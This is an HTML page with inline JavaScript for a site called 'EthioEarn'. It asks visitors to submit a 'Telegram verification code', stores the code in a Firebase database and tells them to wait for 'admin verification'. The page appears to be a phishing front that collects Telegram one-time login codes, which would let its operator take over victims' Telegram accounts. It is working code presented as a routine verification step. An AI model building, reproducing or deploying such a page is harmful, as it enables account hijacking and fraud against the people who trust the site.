<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Verification - EthioEarn</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
    background: linear-gradient(135deg, #0f1724 0%, #1e293b 100%);
    color: white;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.container {
    width: 100%;
    max-width: 450px;
}

.card {
    background: rgba(30, 41, 59, 0.9);
    backdrop-filter: blur(10px);
    border-radius: 16px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    padding: 30px;
    width: 100%;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.logo {
    text-align: center;
    margin-bottom: 20px;
    font-size: 32px;
    font-weight: bold;
    background: linear-gradient(90deg, #06b6d4, #0891b2);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
}

h2 {
    text-align: center;
    margin-bottom: 25px;
    color: #f8fafc;
    font-weight: 600;
}

.input-group {
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 14px;
    background: #334155;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    transition: all 0.3s ease;
    border: 1px solid #475569;
}

input:focus {
    outline: none;
    border-color: #06b6d4;
    box-shadow: 0 0 0 2px rgba(6, 182, 212, 0.2);
}

input::placeholder {
    color: #94a3b8;
}

button {
    width: 100%;
    padding: 14px;
    background: linear-gradient(90deg, #06b6d4, #0891b2);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    margin-top: 10px;
}

button:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(6, 182, 212, 0.4);
}

.status {
    margin-top: 20px;
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    font-weight: 600;
    transition: all 0.3s ease;
}

.pending {
    background: rgba(234, 179, 8, 0.2);
    color: #eab308;
    border: 1px solid rgba(234, 179, 8, 0.3);
}

.verified {
    background: rgba(34, 197, 94, 0.2);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
}

.rejected {
    background: rgba(239, 68, 68, 0.2);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.3);
}
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="logo">EthioEarn</div>
        <h2>Telegram Verification</h2>
        <form id="verifyForm">
            <div class="input-group">
                <input type="text" id="telegramCode" placeholder="Enter Telegram verification code" required />
            </div>
            <button type="submit">Submit Code</button>
            <p class="status" id="status">⏳ Waiting for code submission...</p>
        </form>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyBQ-E4YrEChSdnpAfVpTjRWPsI_eM8d_VY",
  authDomain: "ethioearn.firebaseapp.com",
  projectId: "ethioearn",
  storageBucket: "ethioearn.firebasestorage.app",
  messagingSenderId: "780752809959",
  appId: "1:780752809959:web:cb98a0547ef46148fcd742",
  measurementId: "G-CVHL849LRK"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const form = document.getElementById("verifyForm");
const statusEl = document.getElementById("status");

const userId = localStorage.getItem("currentUserId");
if(!userId){
  alert("No user found, please register again.");
  window.location.href = "index.html";
}

async function checkStatus(){
  const doc = await db.collection("users").doc(userId).get();
  if(doc.exists){
    const data = doc.data();
    if(data.status === "verified"){
      statusEl.textContent = "✅ Verified! Welcome to EthioEarn!";
      statusEl.className = "status verified";
    } else if(data.status === "rejected"){
      statusEl.textContent = "❌ Rejected. Please try again later.";
      statusEl.className = "status rejected";
    } else {
      statusEl.textContent = "⏳ Waiting for admin verification...";
      statusEl.className = "status pending";
    }
  }
}

form.addEventListener("submit", async (e)=>{
  e.preventDefault();
  const telegramCode = document.getElementById("telegramCode").value.trim();
  if(!telegramCode){
    alert("Please enter your Telegram verification code");
    return;
  }

  await db.collection("users").doc(userId).update({ telegramCode });
  alert("Telegram code submitted! Wait for admin verification.");
  checkStatus();
});

setInterval(checkStatus, 4000); // auto-refresh status every 4 seconds
checkStatus();
</script>

</body>
</html>
